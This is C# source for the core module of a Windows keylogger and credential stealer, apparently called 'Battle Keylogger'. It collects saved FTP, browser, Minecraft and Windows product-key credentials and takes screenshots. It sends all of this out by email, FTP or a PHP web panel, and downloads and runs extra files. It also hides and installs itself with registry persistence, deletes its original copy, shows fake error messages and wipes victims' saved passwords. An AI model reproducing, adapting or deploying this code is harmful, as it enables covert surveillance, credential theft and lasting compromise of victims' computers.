using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Drawing;
using System.Text;
using System.Reflection;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Net;
using System.Net.Mail;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Reflection.Emit;
using Microsoft.Win32;
using iSpy.Password_Recovery;
using System.Security.Cryptography;
using System.Security.Principal;

namespace iSpy
{
    public class Core
    {
        public const string USER32 = "user32";
        public const string KERNEL32 = "kernel32";

        public static T CreateAPI<T>(string name, string method)
        {
            try
            {
                IntPtr loadLibHWND = CallAPI<IntPtr>(KERNEL32, "LoadLibraryA", new Type[] { typeof(string) }, name);
                IntPtr hwnd = CallAPI<IntPtr>(KERNEL32, "GetProcAddress", new Type[] { typeof(IntPtr), typeof(string) }, loadLibHWND, method);
                return (T)(object)Marshal.GetDelegateForFunctionPointer(hwnd, typeof(T));
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, string.Format("Error creating API: {1}@{0}:{2}", name, method, Marshal.GetLastWin32Error())); }
            return default(T);
        }
        public static TR CallAPI<TR>(string name, string method, Type[] typeArr, params object[] arguments)
        {
            ModuleBuilder mb = AppDomain.CurrentDomain.DefineDynamicAssembly(new AssemblyName(Guid.NewGuid().ToString()), AssemblyBuilderAccess.Run).DefineDynamicModule(Guid.NewGuid().ToString());
            MethodBuilder methB = mb.DefinePInvokeMethod(method, name, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, typeof(TR),
            typeArr, CallingConvention.Winapi, CharSet.Ansi);
            methB.SetImplementationFlags(MethodImplAttributes.PreserveSig);
            mb.CreateGlobalFunctions();
            MethodInfo mi = mb.GetMethod(method);
            return (TR)mi.Invoke(null, arguments);
        }

        public static string GetInstallPath()
        {
            string installPath = string.Empty;
            if (Config.PATH_TYPE.Equals("1"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            else if (Config.PATH_TYPE.Equals("2"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            else if (Config.PATH_TYPE.Equals("3"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            else if (Config.PATH_TYPE.Equals("4"))
                installPath = Path.GetTempPath().Substring(0, Path.GetTempPath().Length - 1);
            else
                return Application.ExecutablePath;
            installPath += "\\" + Config.FOLDER_NAME + "\\" + Config.FILE_NAME;
            return installPath;
        }
         public static string GetPInstallPathNoFilename()
        {
            string installPath = string.Empty;
            if (Config.PATH_TYPE.Equals("1"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            else if (Config.PATH_TYPE.Equals("2"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            else if (Config.PATH_TYPE.Equals("3"))
                installPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            else if (Config.PATH_TYPE.Equals("4"))
                installPath = Path.GetTempPath().Substring(0, Path.GetTempPath().Length - 1);
            else
                return Application.StartupPath;
            installPath += "\\" + Config.FOLDER_NAME + "\\";
            return installPath;
        }
        public static bool IsAdmin()
        {
            bool Admin;
            try
            {
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                Admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (UnauthorizedAccessException ex)
            {
                Admin = false;
            }
            catch (Exception ex)
            {
                Admin = false;
            }
            return Admin;
        }
        public static void RecoverPasswords()
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                sb.Append(FileZilla.Recover());
                sb.Append(CoreFTP.Recover());
                sb.Append(Minecraft.Recover());
                sb.Append(WindowsProductKey.Recover());
                Upload("Password Recovery", sb.ToString(), "2");
                new Thread(new ThreadStart(delegate { recoverBrowser(); })).Start();
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
        }

        private static void recoverBrowser()
        {
            String passes = "";
            passes = Browsers.recover2();
            Thread.Sleep(30000);
            if (!passes.Equals(""))
                Upload("Stolen Passes", passes, "2");

        }

        public static void Decrypt()
        {
            Config.EMAIL_USERNAME = StringCipher.Decrypt(Config.EMAIL_USERNAME, Config.MUTEX);
            Config.EMAIL_PASSWORD = StringCipher.Decrypt(Config.EMAIL_PASSWORD, Config.MUTEX);
            Config.EMAIL_PORT = StringCipher.Decrypt(Config.EMAIL_PORT, Config.MUTEX);
            Config.EMAIL_SERVER = StringCipher.Decrypt(Config.EMAIL_SERVER, Config.MUTEX);

            Config.FTP_USERNAME = StringCipher.Decrypt(Config.FTP_USERNAME, Config.MUTEX);
            Config.FTP_PASSWORD = StringCipher.Decrypt(Config.FTP_PASSWORD, Config.MUTEX);
            Config.FTP_SERVER = StringCipher.Decrypt(Config.FTP_SERVER, Config.MUTEX);
            if (!Uri.IsWellFormedUriString(Config.FTP_SERVER, UriKind.Absolute))
            {
                if(Uri.IsWellFormedUriString("ftp://"+Config.FTP_SERVER, UriKind.Absolute))
                    Config.FTP_SERVER = "ftp://"+Config.FTP_SERVER;
            }

            Config.PHP_KEY = StringCipher.Decrypt(Config.PHP_KEY, Config.MUTEX);
            Config.WEBPANEL = StringCipher.Decrypt(Config.WEBPANEL, Config.MUTEX);
            Config.GUID = "{windows-[" + Config.HWID + "]}";
        }

        public static void DeleteSavedPasswords()
        {
            try
            {
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\.minecraft\lastlogin");
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            try
            {
                string chromePath = StringCipher.Decrypt("[CHROMEPATH]", Config.MUTEX);
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + "Login Data");
                File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + chromePath + "Web Data");
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            try
            {
                foreach (string folder in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Application Data\Mozilla\Firefox\Profiles\"))
                {
                    if (folder.Contains(".default"))
                    {
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"\Login Data");
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"\signons.txt");
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"\signons2.txt");
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"\signons3.txt");
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"signons.sqlite");
                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + folder + @"\key3.db");
                    }
                }
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
        }

        public static string UploadScreenshot()
        {
            string result = string.Empty;
            string filepath = Path.GetTempPath() + "img.png";
            try
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    Bitmap bmp;
                    Graphics gfx;
                    bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                    gfx = Graphics.FromImage(bmp);
                    gfx.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    bmp.Save(filepath, System.Drawing.Imaging.ImageFormat.Png);
                    using (WebClient client = new WebClient())
                    {
                        result = System.Text.ASCIIEncoding.UTF8.GetString(client.UploadFile(new Uri("http://uploads.im/api?upload"), filepath));
                    }
                    result = result.Substring(result.IndexOf("img_url") + 10, (result.IndexOf("\",\"img_view\"") - (result.IndexOf("img_url") + 10)));
                    result = result.Replace("\\/", "/");
                    File.Delete(filepath);
                }
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return result;
        }
        #region " HWID "

        private static string GenerateHWID()
        {
            try
            {
                Guid IntGuID = new Guid();
                uint IntSerialNum = 0;
                string str = "C:";
                string str1 = null;
                uint num = 0;
                uint num1 = 0;
                string str2 = null;
                GetVolumeInformationA(ref str, ref str1, 255, ref IntSerialNum, ref num, ref num1, ref str2, 255);
                HidD_GetHidGuid(ref IntGuID);
                string GenerateHwid = MD5(string.Concat(IntGuID.ToString(), IntSerialNum.ToString()));
                return GenerateHwid;
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return string.Empty;
        }
        private static string MD5(string inputstr)
        {
            string Md5Hash;
            using (MD5CryptoServiceProvider md5object = new MD5CryptoServiceProvider())
            {
                byte[] BytesToHash = md5object.ComputeHash(Encoding.ASCII.GetBytes(inputstr));
                string Output = null;
                byte[] numArray = BytesToHash;
                for (int i = 0; i < checked((int)numArray.Length); i++)
                {
                    byte b = numArray[i];
                    Output = string.Concat(Output, b.ToString("X2"));
                }
                Md5Hash = Output.ToUpper();
            }
            return Md5Hash;
        }
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool GetVolumeInformationA(ref string lpRootPathName, ref string lpVolumeNameBuffer, uint nVolumeNameSize, ref uint lpVolumeSerialNumber, ref uint lpMaximumComponentLength, ref uint lpFileSystemFlags, ref string lpFileSystemNameBuffer, uint nFileSystemNameSize);

        [DllImport("hid", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern void HidD_GetHidGuid(ref Guid hidGuid);

        #endregion
        
        public static void FileExecuted()
        {
                string notifyFile = Path.GetTempPath() + Config.HWID + ".dat";
                if (!File.Exists(notifyFile))
                {
                    //Install File Notification (One Time Things, Error Msg)
                    Core.Upload("Battle Keylogger Running Notification", "Battle Keylogger is currently active." + Environment.NewLine + ComputerInformation.GetInformation(), "1");
                    if (!string.IsNullOrEmpty(Config.MESSAGE_TYPE))
                    {
                        new Thread(new ThreadStart(FakeMessage)).Start();
                        //ThreadPool.QueueUserWorkItem(FakeMessage);
                    }
                    if (!string.IsNullOrEmpty(Config.DOWNLOAD_FILE))
                    {
                        try
                        {
                            string downloadFilePath = Path.GetTempFileName();
                            File.Delete(downloadFilePath);
                            downloadFilePath = downloadFilePath.Substring(0, downloadFilePath.Length - 4);
                            downloadFilePath += Config.DOWNLOAD_FILE_TYPE;
                            new WebClient().DownloadFile(Config.DOWNLOAD_FILE, downloadFilePath);
                            Process.Start(downloadFilePath);
                        }
                        catch { }
                    }
                    if (!string.IsNullOrEmpty(Config.PASSWORD_STEALER))
                        Core.RecoverPasswords();
                    if (!string.IsNullOrEmpty(Config.CLEAR_SAVED))
                        Core.DeleteSavedPasswords();
                    File.WriteAllText(notifyFile, Config.GUID + Environment.NewLine + Application.ExecutablePath);
                }
                if (!string.IsNullOrEmpty(Config.CLIPBOARD_MONITORING))
                    ClipboardMonitor.Start();

                if (!string.IsNullOrEmpty(Config.MODIFY_TASK_MANAGER))
                    Services.ModifyTaskManager();
                new Thread(new ParameterizedThreadStart(Startup)).Start(GetInstallPath());
        }

        public static void Install()
        {
            try
            {
                string runningPath = Application.ExecutablePath;
                if (runningPath.Equals(GetInstallPath()))
                    return;
                string installPath = string.Empty;
                if (Config.PATH_TYPE.Equals("1"))
                    installPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                else if (Config.PATH_TYPE.Equals("2"))
                    installPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                else if (Config.PATH_TYPE.Equals("3"))
                    installPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                else if (Config.PATH_TYPE.Equals("4"))
                    installPath = Path.GetTempPath().Substring(0, Path.GetTempPath().Length - 1);
                installPath += "\\" + Config.FOLDER_NAME;
                if (!Directory.Exists(installPath))
                {
                    try
                    {
                        Directory.CreateDirectory(installPath);
                    }
                    catch { }
                }
                installPath += "\\" + Config.FILE_NAME;

                try
                {
                    File.Copy(runningPath, installPath, true); //Drops file
                }
                catch { }
                try
                {
                    Core.CallAPI<bool>("kernel32", "DeleteFile", new Type[] { typeof(string) }, installPath + StringCipher.Decrypt("[ZONEID]", Config.MUTEX));
                }
                catch { }

                Core.Upload("Battle Keylogger Installation Notification", "Battle Keylogger has been installed with the Galaxy Logger Installation Module" + Environment.NewLine + ComputerInformation.GetInformation(), "4");

                if (!string.IsNullOrEmpty(Config.HIDE_FILE))
                {
                    try
                    {
                        File.SetAttributes(installPath, FileAttributes.Hidden);
                        File.SetAttributes(installPath, FileAttributes.System);
                    }
                    catch { }
                }

                if (!string.IsNullOrEmpty(Config.MELT_FILE))
                {
                    try
                    {
                        ProcessStartInfo info = new ProcessStartInfo();
                        info.CreateNoWindow = true;
                        info.UseShellExecute = false;
                        info.FileName = "cmd";
                        info.Arguments = "/c ping -n 3 127.0.0.1 > nul & del " + '"' + runningPath + '"';
                        Process.Start(info);
                    }
                    catch { }
                }
                Process.Start(installPath);
                //GC.Collect();
                Environment.Exit(0);
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
        }

        private static void Startup(object args)
        {
            string installPath = args.ToString();
            do
            {
                try
                {
                    if (!string.IsNullOrEmpty(Config.HKCU))
                        Registry.CurrentUser.OpenSubKey(StringCipher.Decrypt("[REGISTRYPATH]", Config.MUTEX), true).SetValue(Config.HKCU, installPath);
                }
                catch { }
                try
                {
                    if (!string.IsNullOrEmpty(Config.HKLM))
                        Registry.LocalMachine.OpenSubKey(StringCipher.Decrypt("[REGISTRYPATH]", Config.MUTEX), true).SetValue(Config.HKLM, installPath);
                }
                catch { }

            }
            while (!string.IsNullOrEmpty(Config.REGISTRY_PERSISTENCE));
        }

        private static void FakeMessage()
        {
            if (Config.MESSAGE_TYPE.Equals("Error"))
                MessageBox.Show(Config.MESSAGE_BODY, Config.MESSAGE_TITLE, MessageBoxButtons.OK, MessageBoxIcon.Error);
            else if (Config.MESSAGE_TYPE.Equals("Warning"))
                MessageBox.Show(Config.MESSAGE_BODY, Config.MESSAGE_TITLE, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            else if (Config.MESSAGE_TYPE.Equals("Information"))
                MessageBox.Show(Config.MESSAGE_BODY, Config.MESSAGE_TITLE, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        public static bool Upload(string title, string data, string type)
        {
            try
            {
                if (Config.UPLOAD_METHOD.Equals("EMAIL"))
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient(Config.EMAIL_SERVER);
                    mail.From = new MailAddress(Config.EMAIL_USERNAME);
                    mail.To.Add(Config.EMAIL_USERNAME);
                    mail.Subject = title + " - " + Environment.UserName + "\\" + Environment.MachineName;
                    mail.Body = data;
                    SmtpServer.Port = Convert.ToInt32(Config.EMAIL_PORT);
                    SmtpServer.Credentials = new System.Net.NetworkCredential(Config.EMAIL_USERNAME, Config.EMAIL_PASSWORD);
                    SmtpServer.EnableSsl = !string.IsNullOrEmpty(Config.EMAIL_SSL);
                    SmtpServer.Send(mail);
                }
                else if (Config.UPLOAD_METHOD.Equals("FTP"))
                {
                    byte[] bytes = System.Text.ASCIIEncoding.ASCII.GetBytes((data));
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(Config.FTP_SERVER + "/" + title.Replace(" ", "_") + "-" + Environment.UserName + "_" + Environment.MachineName + DateTime.Now.ToString("yyyyMMddHHmmssffff") + ".txt");
                    request.Method = WebRequestMethods.Ftp.UploadFile;
                    request.Credentials = new NetworkCredential(Config.FTP_USERNAME, Config.FTP_PASSWORD);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                    Console.WriteLine("Upload File Complete, status {0}", response.StatusDescription);
                }
                else if (Config.UPLOAD_METHOD.Equals("PHP"))
                {
                    if (!type.Equals("4"))
                    {
                        using (WebClient client = new WebClient())
                        {
                            byte[] response = client.UploadValues(Config.WEBPANEL + "/insert", new NameValueCollection()
                            {
                                { "key", Config.PHP_KEY },
                                { "type", type },
                                { "pcname", ComputerInformation.GetName() },
                                { "log", data},
                                { "hwid", GenerateHWID() }
                            });
                        }
                    }
                    else
                    {
                        using (WebClient client = new WebClient())
                        {
                            byte[] response = client.UploadValues(Config.WEBPANEL + "/install", new NameValueCollection()
                            {
                                { "key", Config.PHP_KEY },
                                { "os", ComputerInformation.GetOS() }, //We use args for something else because php accepts diff parameters for installing
                                { "pcname", ComputerInformation.GetName() },
                                { "hwid", GenerateHWID() }
                            });
                        }
                    }
                }
                return true;
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return false;
        }
        private static Bitmap GetScreenshot()
        {
            Bitmap bmp = null;
            try
            {
                bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                using (MemoryStream ms = new MemoryStream())
                {

                    Graphics gfx = Graphics.FromImage(bmp);
                    gfx.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                    return bmp;
                }
            }
            catch (Exception ex) { Config.DumpErrorLog(ex, null); }
            return bmp;
        }
    }
}
